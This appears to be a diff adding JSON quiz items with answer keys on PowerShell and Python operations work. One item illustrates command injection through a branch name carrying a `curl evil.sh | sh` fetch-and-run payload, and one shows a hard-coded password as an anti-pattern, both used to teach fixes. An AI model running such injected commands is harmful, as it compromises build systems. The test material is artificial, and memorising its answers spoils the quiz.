+  "explanation": "Averages hide the tail. If 2% of requests take 4 s, the mean stays low while real users suffer. Use percentiles and heatmaps."
+ },
+ {
+  "id": "ps-m-001",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Services that should be running",
+  "scenario": "After a reboot you want every service set to start automatically that is currently stopped.",
+  "question": "Which pipeline gives exactly that?",
+  "options": [
+   "`Get-Service | Where-Object { $_.StartType -eq 'Automatic' -and $_.Status -eq 'Stopped' }`",
+   "`Get-Service | grep Stopped`",
+   "`Get-Service -Status Stopped -StartType Automatic`",
+   "`Get-Service | Select-String Automatic`"
+  ],
+  "answer": 0,
+  "explanation": "`$_` is the current object, and you filter on real properties. `Get-Service` has no `-Status` parameter, and grep or `Select-String` would match formatted text, not properties."
+ },
+ {
+  "id": "ps-m-002",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Disk space across 40 servers",
+  "scenario": "You need free space on C: for 40 Windows servers listed in `servers.txt`, in one table.",
+  "question": "What's the most practical approach?",
+  "options": [
+   "`Invoke-Command -ComputerName (Get-Content servers.txt) -ScriptBlock { Get-PSDrive C | Select-Object Used, Free }`",
+   "RDP into each server and check Explorer",
+   "`foreach` with `ping` to each host",
+   "`Get-PSDrive C -ComputerName servers.txt`"
+  ],
+  "answer": 0,
+  "explanation": "`Invoke-Command` runs in parallel (32 at a time by default) and tags each result with `PSComputerName`. Pipe it to `Sort-Object Free` or `Export-Csv` for the report."
+ },
+ {
+  "id": "ps-m-003",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Password in the script",
+  "context": [
+   {
+    "kind": "text",
+    "title": "deploy.ps1",
+    "content": "$pass = \"Sup3rS3cret!\"\n$cred = New-Object PSCredential(\"acme\\svc-deploy\", (ConvertTo-SecureString $pass -AsPlainText -Force))\nInvoke-Command -ComputerName app01 -Credential $cred -ScriptBlock { ... }\n"
+   }
+  ],
+  "question": "A reviewer blocks this. What's the better pattern for an automated job?",
+  "options": [
+   "Fetch the secret at runtime from a vault (SecretManagement module with Azure Key Vault/AWS Secrets Manager/CyberArk), or use a gMSA so there's no password at all",
+   "Base64-encode the password",
+   "Move the password to a comment",
+   "Rename the variable to `$p`"
+  ],
+  "answer": 0,
+  "explanation": "`Microsoft.PowerShell.SecretManagement` plus a vault extension gives `Get-Secret`, and group Managed Service Accounts let Windows rotate the password itself. Hard-coded secrets end up in Git, backups and transcripts."
+ },
+ {
+  "id": "ps-m-004",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Event IDs that matter",
+  "scenario": "Security asks for every **failed logon** on a domain controller in the last 24 hours.",
+  "question": "Which query is right?",
+  "options": [
+   "`Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4625; StartTime=(Get-Date).AddDays(-1) }`",
+   "`Get-WinEvent -LogName Security | Where-Object Id -eq 4624`",
+   "`Get-EventLog -LogName Application -InstanceId 4625`",
+   "`Select-String 4625 C:\\Windows\\System32\\winevt`"
+  ],
+  "answer": 0,
+  "explanation": "4625 is a failed logon (4624 is a success). `-FilterHashtable` filters inside the event log service, which is far faster than reading everything and piping it to `Where-Object`."
+ },
+ {
+  "id": "ps-m-005",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Script works by hand, fails in Task Scheduler",
+  "scenario": "`cleanup.ps1` works in your console. As a scheduled task running as SYSTEM, it does nothing, and the task shows result `0x1`.",
+  "question": "What's the most likely cause?",
+  "options": [
+   "Relative paths / mapped drives / user-profile assumptions that don't exist for SYSTEM — use absolute (UNC) paths, `$PSScriptRoot`, and log with `Start-Transcript`",
+   "Task Scheduler can't run PowerShell",
+   "SYSTEM has fewer rights than an admin",
+   "The script must be renamed to .bat"
+  ],
+  "answer": 0,
+  "explanation": "The working directory is `C:\\Windows\\System32`, mapped drives belong to your logon session, and `$HOME` differs. Make the action `pwsh.exe -NoProfile -File C:\\scripts\\cleanup.ps1`, and log so you can see what happened."
+ },
+ {
+  "id": "ps-m-006",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "multi",
+  "title": "Bash habits that bite in PowerShell",
+  "question": "Which statements are TRUE for PowerShell? (select all)",
+  "options": [
+   "`>` is redirection, so `if ($a > 5)` writes a file named 5",
+   "`curl` and `wget` in Windows PowerShell 5.1 are aliases for `Invoke-WebRequest`",
+   "Variables are case-insensitive: `$Path` and `$path` are the same",
+   "Single quotes expand variables, like double quotes"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "Use `-gt` for comparisons. Call `curl.exe` explicitly or use `Invoke-RestMethod` (the aliases were removed in PowerShell 7). Single quotes are literal; double quotes expand `$var` and `$(expr)`."
+ },
+ {
+  "id": "ps-m-007",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Call a REST API",
+  "scenario": "You need the `status` field from `https://api.acme.io/health`, which returns JSON.",
+  "question": "What's the idiomatic way?",
+  "options": [
+   "`(Invoke-RestMethod https://api.acme.io/health).status`",
+   "`Invoke-WebRequest https://api.acme.io/health | Select-String status`",
+   "`curl https://api.acme.io/health | jq .status`",
+   "`Get-Content https://api.acme.io/health`"
+  ],
+  "answer": 0,
+  "explanation": "`Invoke-RestMethod` deserialises JSON into objects automatically. `Invoke-WebRequest` returns the raw response (`.Content`, `.StatusCode`); to parse it yourself, use `ConvertFrom-Json`."
+ },
+ {
+  "id": "ps-m-008",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "IIS logs are eating the disk",
+  "scenario": "Delete IIS log files older than 14 days under `C:\\inetpub\\logs\\LogFiles`, safely.",
+  "question": "Which command does it (and lets you preview first)?",
+  "options": [
+   "`Get-ChildItem C:\\inetpub\\logs\\LogFiles -Recurse -Filter *.log | Where-Object LastWriteTime -lt (Get-Date).AddDays(-14) | Remove-Item -WhatIf`",
+   "`Remove-Item C:\\inetpub\\logs\\LogFiles -Recurse -Force`",
+   "`del *.log /s`",
+   "`Clear-Content C:\\inetpub\\logs\\LogFiles\\*`"
+  ],
+  "answer": 0,
+  "explanation": "Filter by `LastWriteTime`, preview with `-WhatIf`, then remove it to run for real. Schedule it — or configure IIS log rollover and retention."
+ },
+ {
+  "id": "ps-m-009",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "PowerShell DSC vs a script",
+  "question": "What does Desired State Configuration give you that a plain install script doesn't?",
+  "options": [
+   "Declarative, idempotent configuration with Test/Set logic and drift detection",
+   "Faster execution",
+   "A GUI",
+   "Linux kernel modules"
+  ],
+  "answer": 0,
+  "explanation": "DSC resources implement Test, Get and Set, so re-running only fixes drift. Today, many teams drive the same idea through Azure Machine Configuration, Ansible `win_*` modules, or DSC v3."
+ },
+ {
+  "id": "ps-m-010",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Measure it",
+  "scenario": "A teammate says the `-Filter` version of a query is faster than piping to `Where-Object`. You want proof.",
+  "question": "Which cmdlet times a script block?",
+  "options": [
+   "Measure-Command { ... }",
+   "Get-Timer { ... }",
+   "Time-Object { ... }",
+   "Start-Stopwatch"
+  ],
+  "answer": 0,
+  "explanation": "`Measure-Command` returns a TimeSpan. Filtering on the left (provider or cmdlet parameters) almost always beats filtering on the right, because fewer objects are created."
+ },
+ {
+  "id": "ps-m-011",
+  "level": "medium",
+  "category": "PowerShell",
+  "type": "mcq",
+  "title": "Run once on 200 servers, fast",
+  "scenario": "PowerShell 7. You need to process 500 log files in parallel on one machine.",
+  "question": "Which construct is built for that?",
+  "options": [
+   "`ForEach-Object -Parallel { ... } -ThrottleLimit 8`",
+   "`foreach ($f in $files) { Start-Sleep 0 }`",
+   "`Get-Job -Parallel`",
+   "`Invoke-Parallel` (built-in in 5.1)"
+  ],
+  "answer": 0,
+  "explanation": "PowerShell 7 added `ForEach-Object -Parallel`, which runs each item in its own runspace. Use `$using:var` to pass outer variables in. In 5.1 you'd reach for jobs or runspace pools."
+ },
+ {
+  "id": "py-m-001",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Injected through a branch name",
+  "context": [
+   {
+    "kind": "text",
+    "title": "ci_helper.py",
+    "content": "branch = os.environ[\"BRANCH_NAME\"]\nsubprocess.run(f\"git checkout {branch} && make deploy\", shell=True, check=True)\n"
+   }
+  ],
+  "question": "A PR named `x; curl evil.sh | sh` gets this executed. What's the fix?",
+  "options": [
+   "Pass a list without a shell: `subprocess.run([\"git\", \"checkout\", branch], check=True)`, then run `make` separately",
+   "Wrap `branch` in double quotes inside the f-string",
+   "Use `os.system` instead",
+   "Strip semicolons only"
+  ],
+  "answer": 0,
+  "explanation": "`shell=True` with interpolated input is command injection. Use an argument list, and validate branch names (`git check-ref-format`). If you truly need a shell, `shlex.quote()` every value."
+ },
+ {
+  "id": "py-m-002",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Throttled by AWS",
+  "context": [
+   {
+    "kind": "log",
+    "title": "traceback",
+    "content": "botocore.exceptions.ClientError: An error occurred (ThrottlingException) when calling the DescribeInstances operation (reached max retries: 4): Rate exceeded\n"
+   }
+  ],
+  "question": "Your inventory script calls `describe_instances` across 30 accounts in a tight loop. Best fix?",
+  "options": [
+   "Configure retries (`Config(retries={\"mode\": \"adaptive\", \"max_attempts\": 10})`), use paginators/filters, and limit concurrency",
+   "Catch the exception and ignore it",
+   "Add `time.sleep(0)`",
+   "Switch regions"
+  ],
+  "answer": 0,
+  "explanation": "botocore has built-in retry modes: standard, and adaptive (client-side rate limiting). Fetching less — filters, paginators, AWS Config aggregator or Resource Explorer — beats hammering APIs."
+ },
+ {
+  "id": "py-m-003",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Works locally, ImportError in the container",
+  "context": [
+   {
+    "kind": "dockerfile",
+    "title": "Dockerfile",
+    "content": "FROM python:3.12-slim\nWORKDIR /app\nCOPY app/ .\nRUN pip install flask\nCMD [\"python\", \"main.py\"]\n"
+   }
+  ],
+  "question": "The app also needs `boto3` and `pydantic`, which are installed on the developer's laptop. What's the real fix?",
+  "options": [
+   "Install from a pinned requirements/lock file in the image (`COPY requirements.txt .` → `pip install --no-cache-dir -r requirements.txt`)",
+   "Add each missing package to the RUN line as errors appear",
+   "Copy the laptop's site-packages into the image",
+   "Use `python:latest`"
+  ],
+  "answer": 0,
+  "explanation": "The image must be built from declared dependencies, not from whatever happens to be on someone's machine. Copy the requirements before the code so the dependency layer stays cached."
+ },
+ {
+  "id": "py-m-004",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Mutable default argument",
+  "context": [
+   {
+    "kind": "text",
+    "title": "tags.py",
+    "content": "def add_tag(tag, tags=[]):\n    tags.append(tag)\n    return tags\n\nadd_tag(\"team:payments\")   # ['team:payments']\nadd_tag(\"env:prod\")        # ['team:payments', 'env:prod']  ???\n"
+   }
+  ],
+  "question": "Why does the second call keep the first tag?",
+  "options": [
+   "Default values are evaluated once at definition time — use `tags=None` and create a new list inside",
+   "Lists are immutable",
+   "`append` is asynchronous",
+   "Python caches return values"
+  ],
+  "answer": 0,
+  "explanation": "A classic bug that corrupts tag sets and payloads in long-running workers. Write `def add_tag(tag, tags=None): tags = [] if tags is None else tags`."
+ },
+ {
+  "id": "py-m-005",
+  "level": "medium",
+  "category": "Python",
+  "type": "multi",
+  "title": "Production-ready automation script",
+  "question": "Which practices make an ops script safe to run in CI against prod? (select all)",
+  "options": [
+   "`--dry-run` default or flag, and explicit confirmation for destructive actions",
+   "Timeouts and retries with backoff on every network call",
+   "Exit with a non-zero code on failure so the pipeline stops",
+   "Catch `Exception` and `pass` so the job always goes green"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "A green job that silently failed is worse than a red one. Fail loudly, retry what's retryable, and make destructive paths opt-in."
+ },
+ {
+  "id": "py-m-006",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Kubernetes from Python",
+  "scenario": "An in-cluster CronJob in Python must list Pods in its own namespace.",
+  "question": "How should it authenticate?",
+  "options": [
+   "`kubernetes.config.load_incluster_config()` with a ServiceAccount bound to a namespaced Role allowing `list pods`",
+   "Bake a kubeconfig with cluster-admin into the image",
+   "Call the API server anonymously",
+   "Mount the node's /etc/kubernetes"
+  ],
+  "answer": 0,
+  "explanation": "In-cluster config reads the projected ServiceAccount token and CA. Least-privilege RBAC keeps a bug from turning into a cluster-wide incident."
+ },
+ {
+  "id": "py-m-007",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Slow sequential health checks",
+  "scenario": "A script checks 300 internal HTTPS endpoints one by one with `requests` and takes 12 minutes. The work is I/O-bound.",
+  "question": "What gives the biggest speed-up with minimal change?",
+  "options": [
+   "`concurrent.futures.ThreadPoolExecutor(max_workers=32)` (or asyncio + httpx) with a per-request timeout",
+   "Use multiprocessing with 300 processes",
+   "Rewrite in Bash",
+   "Increase the timeout"
+  ],
+  "answer": 0,
+  "explanation": "Threads are fine for network waits despite the GIL. Bound the concurrency so you don't DoS your own services, and always set timeouts."
+ },
+ {
+  "id": "py-m-008",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Datetime surprise",
+  "scenario": "A cleanup job deletes snapshots older than 7 days using `datetime.now() - snap['StartTime']` and crashes: `can't subtract offset-naive and offset-aware datetimes`.",
+  "question": "What's the right fix?",
+  "options": [
+   "Use timezone-aware now: `datetime.now(timezone.utc)`",
+   "Strip timezone info from AWS timestamps with `.replace(tzinfo=None)` everywhere",
+   "Convert both to strings and compare",
+   "Use `time.sleep`"
+  ],
+  "answer": 0,
+  "explanation": "boto3 returns timezone-aware UTC datetimes. Keep everything aware and in UTC — mixing naive and aware datetimes is a bug factory, especially with Dubai (UTC+4) laptops and UTC servers."
+ },
+ {
+  "id": "py-m-009",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Secrets in a Lambda",
+  "scenario": "A Python Lambda reads a DB password from Secrets Manager on every invocation, adding 80 ms and API costs.",
+  "question": "Best improvement?",
+  "options": [
+   "Fetch once at init (outside the handler) and cache with a TTL — or use the AWS Parameters and Secrets Lambda Extension",
+   "Hard-code the password",
+   "Store it in an env var in plaintext",
+   "Call Secrets Manager twice to be safe"
+  ],
+  "answer": 0,
+  "explanation": "Code outside the handler runs once per execution environment. A TTL cache still picks up rotations, and the extension provides a local cached HTTP endpoint."
+ },
+ {
+  "id": "py-m-010",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Type hints in CI",
+  "question": "What does running `mypy` (or pyright) in CI buy an ops team?",
+  "options": [
+   "Catches wrong-type bugs (None where a str is expected, wrong boto3 shapes) before runtime",
+   "Makes Python compile to machine code",
+   "Formats the code",
+   "Encrypts the script"
+  ],
+  "answer": 0,
+  "explanation": "Most production Python failures in automation are `NoneType has no attribute ...`. Type checking with `boto3-stubs` catches many of them in the PR."
+ },
+ {
+  "id": "py-m-011",
+  "level": "medium",
+  "category": "Python",
+  "type": "mcq",
+  "title": "Which package manager?",
+  "scenario": "Your team wants faster CI installs and a lock file without changing much.",
+  "question": "Which tool fits that brief well in 2026?",
+  "options": [
+   "uv (pip-compatible, lock files, very fast)",
+   "easy_install",
+   "conda for every web service",
+   "Copying wheels by hand"
+  ],
+  "answer": 0,
+  "explanation": "uv is a drop-in for pip and venv workflows (`uv pip install -r`, `uv sync` with `uv.lock`) and is dramatically faster. Poetry and pip-tools are also fine; pick one and commit the lock."
+ }
+]
